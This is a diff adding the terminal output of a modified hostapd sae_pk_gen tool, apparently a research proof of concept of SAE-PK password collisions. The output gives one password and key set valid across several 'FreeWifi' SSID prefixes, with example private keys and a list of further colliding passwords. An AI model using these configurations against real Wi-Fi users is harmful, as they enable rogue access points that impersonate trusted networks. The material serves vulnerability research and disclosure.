@@ -1,0 +1,73 @@
+[mathy@zbook-mathy hostapd]$ make sae_pk_gen && ./sae_pk_gen cascade example_key.der 3 'FreeWifi 2.4 GHz! '
+  CC  sae_pk_gen.c
+  LD  sae_pk_gen
+46 72 65 65 57 69 66 69 20 32 2E 34 20 47 48 7A 21 20 30 98 30 96 30 94 30 92 30 90 30 8E 30 8C 30 8A 30 88 00 00 00 00 00 00 00 39 30 13 06 07 2A 86 48 CE 3D 02 01 06 08 2A 86 48 CE 3D 03 01 07 03 22 00 02 E0 6B B1 C9 39 0A 36 DD 0C 12 2B 29 BB F5 CF C4 89 88 9E 3F AD 97 6A E2 FC 97 EE DA 63 90 29 BD 1C 6E 63 B8 E1 04 31 7A 5F 89 81 E6 28 86 E3 C7 
+Searching for a suitable Modifier M value
+157.91%
+
+	[ Network config - 2 ]
+
+ssid2="Fr"
+# SAE-PK password/M/private key/public key.
+sae_password=qvc5-wxmv-yecu|pk=65655769666920322e342047487a2120:MHcCAQEEIKMP3SZEAlW9rSwTFsaR/sEyX963opsOo2QYe4G8Kcl+oAoGCCqGSM49AwEHoUQDQgAE4GuxyTkKNt0MEispu/XPxImInj+tl2ri/Jfu2mOQKb1TdNHSPs6UP+rxv5OWnezhOpjpD63Y+zjjz1yk7/iF7g==:MJgwljCUMJIwkDCOMIwwijCIAAAAAAAAADkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDIgAC4GuxyTkKNt0MEispu/XPxImInj+tl2ri/Jfu2mOQKb0cbmO44QQxel+JgeYqGyKq
+
+	[ Network config - 4 ]
+
+ssid2="Free"
+# SAE-PK password/M/private key/public key.
+sae_password=qvc5-wxmv-yecu|pk=5769666920322e342047487a21203098:MHcCAQEEIKMP3SZEAlW9rSwTFsaR/sEyX963opsOo2QYe4G8Kcl+oAoGCCqGSM49AwEHoUQDQgAE4GuxyTkKNt0MEispu/XPxImInj+tl2ri/Jfu2mOQKb1TdNHSPs6UP+rxv5OWnezhOpjpD63Y+zjjz1yk7/iF7g==:MJYwlDCSMJAwjjCMMIowiAAAAAAAAAA5MBMGByqGSM49AgEGCCqGSM49AwEHAyIAAuBrsck5CjbdDBIrKbv1z8SJiJ4/rZdq4vyX7tpjkCm9HG5juOEEMXpfiYHmKhsiqg==
+
+	[ Network config - 6 ]
+
+ssid2="FreeWi"
+# SAE-PK password/M/private key/public key.
+sae_password=qvc5-wxmv-yecu|pk=666920322e342047487a212030983096:MHcCAQEEIKMP3SZEAlW9rSwTFsaR/sEyX963opsOo2QYe4G8Kcl+oAoGCCqGSM49AwEHoUQDQgAE4GuxyTkKNt0MEispu/XPxImInj+tl2ri/Jfu2mOQKb1TdNHSPs6UP+rxv5OWnezhOpjpD63Y+zjjz1yk7/iF7g==:MJQwkjCQMI4wjDCKMIgAAAAAAAAAOTATBgcqhkjOPQIBBggqhkjOPQMBBwMiAALga7HJOQo23QwSKym79c/EiYieP62XauL8l+7aY5ApvRxuY7jhBDF6X4mB5iobIqo=
+
+	[ Network config - 8 ]
+
+ssid2="FreeWifi"
+# SAE-PK password/M/private key/public key.
+sae_password=qvc5-wxmv-yecu|pk=20322e342047487a2120309830963094:MHcCAQEEIKMP3SZEAlW9rSwTFsaR/sEyX963opsOo2QYe4G8Kcl+oAoGCCqGSM49AwEHoUQDQgAE4GuxyTkKNt0MEispu/XPxImInj+tl2ri/Jfu2mOQKb1TdNHSPs6UP+rxv5OWnezhOpjpD63Y+zjjz1yk7/iF7g==:MJIwkDCOMIwwijCIAAAAAAAAADkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDIgAC4GuxyTkKNt0MEispu/XPxImInj+tl2ri/Jfu2mOQKb0cbmO44QQxel+JgeYqGyKq
+
+	[ Network config - 10 ]
+
+ssid2="FreeWifi 2"
+# SAE-PK password/M/private key/public key.
+sae_password=qvc5-wxmv-yecu|pk=2e342047487a21203098309630943092:MHcCAQEEIKMP3SZEAlW9rSwTFsaR/sEyX963opsOo2QYe4G8Kcl+oAoGCCqGSM49AwEHoUQDQgAE4GuxyTkKNt0MEispu/XPxImInj+tl2ri/Jfu2mOQKb1TdNHSPs6UP+rxv5OWnezhOpjpD63Y+zjjz1yk7/iF7g==:MJAwjjCMMIowiAAAAAAAAAA5MBMGByqGSM49AgEGCCqGSM49AwEHAyIAAuBrsck5CjbdDBIrKbv1z8SJiJ4/rZdq4vyX7tpjkCm9HG5juOEEMXpfiYHmKhsiqg==
+
+	[ Network config - 12 ]
+
+ssid2="FreeWifi 2.4"
+# SAE-PK password/M/private key/public key.
+sae_password=qvc5-wxmv-yecu|pk=2047487a212030983096309430923090:MHcCAQEEIKMP3SZEAlW9rSwTFsaR/sEyX963opsOo2QYe4G8Kcl+oAoGCCqGSM49AwEHoUQDQgAE4GuxyTkKNt0MEispu/XPxImInj+tl2ri/Jfu2mOQKb1TdNHSPs6UP+rxv5OWnezhOpjpD63Y+zjjz1yk7/iF7g==:MI4wjDCKMIgAAAAAAAAAOTATBgcqhkjOPQIBBggqhkjOPQMBBwMiAALga7HJOQo23QwSKym79c/EiYieP62XauL8l+7aY5ApvRxuY7jhBDF6X4mB5iobIqo=
+
+	[ Network config - 14 ]
+
+ssid2="FreeWifi 2.4 G"
+# SAE-PK password/M/private key/public key.
+sae_password=qvc5-wxmv-yecu|pk=487a212030983096309430923090308e:MHcCAQEEIKMP3SZEAlW9rSwTFsaR/sEyX963opsOo2QYe4G8Kcl+oAoGCCqGSM49AwEHoUQDQgAE4GuxyTkKNt0MEispu/XPxImInj+tl2ri/Jfu2mOQKb1TdNHSPs6UP+rxv5OWnezhOpjpD63Y+zjjz1yk7/iF7g==:MIwwijCIAAAAAAAAADkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDIgAC4GuxyTkKNt0MEispu/XPxImInj+tl2ri/Jfu2mOQKb0cbmO44QQxel+JgeYqGyKq
+
+	[ Network config - 16 ]
+
+ssid2="FreeWifi 2.4 GHz"
+# SAE-PK password/M/private key/public key.
+sae_password=qvc5-wxmv-yecu|pk=212030983096309430923090308e308c:MHcCAQEEIKMP3SZEAlW9rSwTFsaR/sEyX963opsOo2QYe4G8Kcl+oAoGCCqGSM49AwEHoUQDQgAE4GuxyTkKNt0MEispu/XPxImInj+tl2ri/Jfu2mOQKb1TdNHSPs6UP+rxv5OWnezhOpjpD63Y+zjjz1yk7/iF7g==:MIowiAAAAAAAAAA5MBMGByqGSM49AgEGCCqGSM49AwEHAyIAAuBrsck5CjbdDBIrKbv1z8SJiJ4/rZdq4vyX7tpjkCm9HG5juOEEMXpfiYHmKhsiqg==
+
+	[ Network config - 18 ]
+
+ssid2="FreeWifi 2.4 GHz! "
+# SAE-PK password/M/private key/public key.
+sae_password=qvc5-wxmv-yecu|pk=30983096309430923090308e308c308a:MHcCAQEEIKMP3SZEAlW9rSwTFsaR/sEyX963opsOo2QYe4G8Kcl+oAoGCCqGSM49AwEHoUQDQgAE4GuxyTkKNt0MEispu/XPxImInj+tl2ri/Jfu2mOQKb1TdNHSPs6UP+rxv5OWnezhOpjpD63Y+zjjz1yk7/iF7g==:MIgAAAAAAAAAOTATBgcqhkjOPQIBBggqhkjOPQMBBwMiAALga7HJOQo23QwSKym79c/EiYieP62XauL8l+7aY5ApvRxuY7jhBDF6X4mB5iobIqo=
+
+
+# All the following longer passwords are also a valid password collision:
+# qvc5-wxmv-yecn-5ywj
+# qvc5-wxmv-yecn-5ywe-s4h6
+# qvc5-wxmv-yecn-5ywe-s4hp-6bwj
+# qvc5-wxmv-yecn-5ywe-s4hp-6bwc-3uak
+# qvc5-wxmv-yecn-5ywe-s4hp-6bwc-3uao-55kl
+# qvc5-wxmv-yecn-5ywe-s4hp-6bwc-3uao-55kv-6oq6
+# qvc5-wxmv-yecn-5ywe-s4hp-6bwc-3uao-55kv-6oq7-3nke
+# qvc5-wxmv-yecn-5ywe-s4hp-6bwc-3uao-55kv-6oq7-3nk5-rryx
+# qvc5-wxmv-yecn-5ywe-s4hp-6bwc-3uao-55kv-6oq7-3nk5-rryy-y74w
+
